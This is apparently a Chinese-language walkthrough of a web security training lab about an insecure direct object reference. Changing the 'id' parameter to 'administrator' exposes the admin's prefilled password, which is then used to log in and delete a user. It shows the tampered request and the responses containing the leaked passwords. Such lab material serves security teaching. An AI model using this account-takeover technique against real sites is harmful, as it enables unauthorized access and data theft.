# 实验：由请求参数控制的用户 ID（存在密码泄露）

本实验有一个用户账户页面，其中包含当前用户的现有密码，该密码已预填充在掩码输入框中。

为了解决本实验，请检索管理员的密码，然后使用它删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 登录后，服务器响应的表单中包含当前密码
    ```html
    <form class="login-form" action="/my-account/change-password" method="POST">
        <br/>
        <label>
            Password
        </label>
        <input required type="hidden" name="csrf" value="V2atxxVkUpuWkzZjdyMasv50YmzWqEUH">
        <input required type=password name=password value='peter'/>
        <button class='button' type='submit'>
            Update password 
        </button>
    </form>
    ```

- 尝试移除会话 cookie 后访问账户页面
    - 成功

- 尝试访问管理员账户页面
    ```http
    GET /my-account?id=administrator HTTP/2
    ```
    - 服务器响应
        ```html
        <form class="login-form" action="/my-account/change-password" method="POST">
            <br/>
            <label>
                Password
            </label>
            <input required type="hidden" name="csrf" value="WZkUXel4ZqcR4LfsBFJtMYyA03ygM1nj">
            <input required type=password name=password value='mvt381k9ket784bqvmpu'/>
            <button class='button' type='submit'>
                Update password 
            </button>
        </form>
        ```

退出当前账户并使用管理员凭据登录，使用管理功能，删除目标用户
